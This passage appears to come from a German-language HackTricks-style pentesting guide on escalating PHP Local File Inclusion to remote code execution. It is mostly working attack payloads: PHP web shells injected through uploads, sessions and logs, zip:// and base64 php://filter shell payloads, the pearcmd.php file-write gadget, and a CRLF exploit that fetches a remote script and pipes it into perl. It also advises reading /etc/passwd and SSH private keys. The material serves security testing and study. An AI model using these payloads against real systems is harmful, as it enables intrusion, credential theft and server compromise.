GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Über Upload

Wenn du eine Datei hochladen kannst, injiziere einfach die shell payload in sie (z. B.: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Um die Datei lesbar zu halten, ist es am besten, sie in die Metadaten von Bildern/Dokumenten/PDFs einzufügen

### Via Zip file upload

Lade eine ZIP-Datei hoch, die eine komprimierte PHP shell enthält, und greife darauf zu:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Über PHP sessions

Prüfe, ob die Website PHP Session (PHPSESSID) verwendet
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
In PHP werden diese sessions in _/var/lib/php5/sess\\_\[PHPSESSID]\_ Dateien gespeichert.
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Setze das Cookie auf `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Benutze das LFI, um die PHP-Session-Datei einzubinden.
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Über ssh

Wenn ssh aktiv ist, prüfe, welcher Benutzer verwendet wird (/proc/self/status & /etc/passwd) und versuche, auf **\<HOME>/.ssh/id_rsa** zuzugreifen

### **Über** **vsftpd** _**logs**_

Die Logs für den FTP-Server vsftpd befinden sich in _**/var/log/vsftpd.log**_. In dem Szenario, in dem eine Local File Inclusion (LFI)-Vulnerability existiert und ein Zugriff auf einen exponierten vsftpd-Server möglich ist, können die folgenden Schritte in Betracht gezogen werden:

1. Injiziere eine PHP-Payload in das username-Feld während des Login-Prozesses.
2. Nach der Injection nutze die LFI, um die Server-Logs von _**/var/log/vsftpd.log**_ auszulesen.

### Über php base64 filter (using base64)

Wie in [dieser](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) Artikel gezeigt, ignoriert der PHP base64 filter einfach Non-base64. Du kannst das nutzen, um die Prüfung der Dateiendung zu umgehen: wenn du base64 lieferst, das mit ".php" endet, würde er einfach den "." ignorieren und "php" an das base64 anhängen. Hier ist ein Beispielpayload:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Über php filters (keine Datei erforderlich)

Dieser [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) erklärt, dass du **php filters** verwenden kannst, um beliebige Inhalte als Ausgabe zu erzeugen. Das bedeutet im Grunde, dass du **beliebigen php code** für das include **erzeugen kannst, ohne ihn in eine Datei schreiben zu müssen**.

{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Über segmentation fault

**Upload** einer Datei, die als **temporäre Datei** in `/tmp` gespeichert wird. Löse dann in derselben Anfrage einen **segmentation fault** aus — die **temporäre Datei wird nicht gelöscht**, und du kannst danach suchen.

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Über Nginx temp file storage

Wenn du eine **Local File Inclusion** gefunden hast und **Nginx** vor PHP läuft, kannst du mit folgender Technik möglicherweise RCE erlangen:

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Über PHP_SESSION_UPLOAD_PROGRESS

Wenn du eine **Local File Inclusion** gefunden hast, selbst wenn du **keine Session** hast und `session.auto_start` auf `Off` steht. Wenn du den **`PHP_SESSION_UPLOAD_PROGRESS`** in **multipart POST**-Daten angibst, wird PHP die Session für dich aktivieren. Du könntest das ausnutzen, um RCE zu erlangen:

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Über temp file uploads in Windows

Wenn du eine **Local File Inclusion** gefunden hast und der Server unter **Windows** läuft, kannst du möglicherweise RCE erlangen:

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### Via `pearcmd.php` + URL args

Wie [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), existiert das Skript `/usr/local/lib/phppearcmd.php` standardmäßig in php docker images. Außerdem ist es möglich, dem Skript Argumente über die URL zu übergeben, da angegeben ist, dass ein URL-Parameter ohne `=` als Argument verwendet werden sollte. Siehe auch [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) und [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

Die folgende Anfrage erstellt eine Datei in `/tmp/hello.php` mit dem Inhalt `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
Das Folgende nutzt eine CRLF vuln aus, um RCE zu erreichen (aus [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Über phpinfo() (file_uploads = on)

Wenn du eine **Local File Inclusion** und eine Datei gefunden hast, die **phpinfo()** mit file_uploads = on zeigt, kannst du RCE erhalten:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Über compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Wenn du eine **Local File Inclusion** gefunden hast und den Pfad der temporären Datei **exfiltrieren kannst**, ABER der **Server** **prüft**, ob die **einzuschließende Datei PHP-Markierungen enthält**, kannst du versuchen, diese Prüfung mit dieser **Race Condition** zu umgehen:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Über eternal waiting + bruteforce

Wenn du die LFI missbrauchen kannst, um **temporäre Dateien hochzuladen** und den Server die PHP-Ausführung **aufhängen** zu lassen, könntest du anschließend **stundenlang Dateinamen per bruteforce** versuchen, um die temporäre Datei zu finden:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Zu einem Fatal Error

Wenn du eine der Dateien `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` einbindest. (Du musst dieselbe Datei zweimal einbinden, um diesen Fehler auszulösen).

**Ich weiß nicht, wie das nützlich ist, aber vielleicht ist es das.**\
_Auch wenn du einen PHP Fatal Error verursachst, werden hochgeladene PHP-Temporärdateien gelöscht._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## Referenzen

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
